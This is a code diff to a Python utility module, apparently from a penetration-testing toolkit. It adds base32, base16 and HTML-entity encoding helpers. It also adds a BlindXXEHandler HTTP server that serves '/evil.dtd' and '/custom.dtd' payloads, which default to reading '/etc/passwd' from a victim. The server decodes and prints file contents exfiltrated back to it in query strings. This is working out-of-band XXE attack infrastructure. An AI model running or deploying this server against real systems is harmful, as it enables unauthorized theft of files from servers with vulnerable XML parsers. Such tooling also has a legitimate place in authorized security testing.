@@ -1,6 +1,8 @@
 
-from base64 import b64decode, b64encode, urlsafe_b64decode, urlsafe_b64encode
+from base64 import (b16decode, b16encode, b32decode, b32encode, b64decode,
+                    b64encode, urlsafe_b64decode, urlsafe_b64encode)
 from binascii import hexlify, unhexlify
+from bz2 import decompress as bz2decompress
 from concurrent.futures import ThreadPoolExecutor
 from functools import wraps
 from hashlib import md5 as _md5
@@ -11,8 +13,9 @@ from http.server import BaseHTTPRequestHandler
 from json import dumps, loads
 from os import path
 from random import choice, randint
+from re import sub
 from string import ascii_lowercase, digits
-from traceback import format_exc
+from traceback import format_exc, print_exc
 from typing import Dict, Union
 from urllib.parse import quote_plus, unquote_plus, urlparse
 
@@ -177,8 +180,73 @@ class ProvideHandler(BaseHTTPRequestHandler):
                 self.send_response(404)
                 self.wfile.write(b"404 Not Found\n")
             return
-        except Exception as e:
-            print("[-] " + str(e))
+        except Exception:
+            print_exc()
+
+
+class BlindXXEHandler(BaseHTTPRequestHandler):
+
+    def __init__(self, content, bz2content, customcontent, *args, **kwargs):
+        self.content = content
+        self.bz2content = bz2content
+        self.customcontent = customcontent
+        super().__init__(*args, **kwargs)
+
+    def log_message(self, format, *args):
+        pass
+
+    def do_GET(self):
+        sendReply = False
+        querypath = urlparse(self.path)
+        query_dict = {}
+        for kv in querypath.query.split("&"):
+            v = kv.split("=")
+            if len(v) > 1:
+                query_dict[v[0]] = unquote_plus(v[1])
+            else:
+                query_dict[v[0]] = None
+        filepath = querypath.path
+        try:
+            if filepath == "/evil.dtd":
+                sendReply = True
+                self.send_response(200)
+                self.send_header("Content-type", "application/xml-dtd")
+                self.end_headers()
+                if "bz2" in query_dict:
+                    content = self.bz2content
+                else:
+                    content = self.content
+                readFile = query_dict.get("file", "/etc/passwd")
+                content = content.replace(b"!readFile!", readFile.encode())
+                print("test\n", content)
+                self.wfile.write(content)
+            elif filepath == "/custom.dtd":
+                sendReply = True
+                self.send_response(200)
+                self.send_header("Content-type", "application/xml-dtd")
+                self.end_headers()
+                content = self.customcontent
+                link = query_dict.get("link", "")
+                content = content.replace(b"!link!", link.encode())
+                self.wfile.write(content)
+            else:
+                data = querypath.query
+                try:
+                    data = b64decode(data)
+                    data = bz2decompress(data)
+                except Exception:
+                    pass
+                print("Receive file content:\n" + data.decode())
+                sendReply = True
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'<?xml version="1.0"?>\n<root></root>\n')
+            if not sendReply:
+                self.send_response(404)
+                self.wfile.write(b"404 Not Found\n")
+            return
+        except Exception:
+            print_exc()
 
 
 def url_encode(s: str, encoding: str = 'utf-8') -> str:
@@ -207,6 +275,55 @@ def base64_encode(s: str, encoding='utf-8') -> str:
         return b64encode(s.encode()).decode(encoding=encoding)
     except Exception:
         return ""
+
+
+def base32_decode(s: str, encoding='utf-8') -> str:
+    try:
+        return b32decode(s.encode()).decode(encoding=encoding)
+    except Exception:
+        return ""
+
+
+def base32_encode(s: str, encoding='utf-8') -> str:
+    try:
+        return b32encode(s.encode()).decode(encoding=encoding)
+    except Exception:
+        return ""
+
+
+def base16_decode(s: str, encoding='utf-8') -> str:
+    try:
+        return b16decode(s.encode()).decode(encoding=encoding)
+    except Exception:
+        return ""
+
+
+def base16_encode(s: str, encoding='utf-8') -> str:
+    try:
+        return b16encode(s.encode()).decode(encoding=encoding)
+    except Exception:
+        return ""
+
+
+def html_decode(s: str) -> str:
+    def replace(matched):
+        value = int(matched.group(1))
+        return chr(value)
+
+    def replace_hex(matched):
+        value = int(matched.group(1), 16)
+        return chr(value)
+    s = sub(r'&#x(\w+);', replace_hex, s)
+    s = sub(r'&#(\w+);', replace, s)
+    return s
+
+
+def html_encode(s: str, asHex: bool = False) -> str:
+    if asHex:
+        ss = "".join(f"&#x{hex(ord(c))[2:]};" for c in s)
+    else:
+        ss = "".join(f"&#{ord(c)};" for c in s)
+    return ss
 
 
 def bin2hex(s: str) -> str:
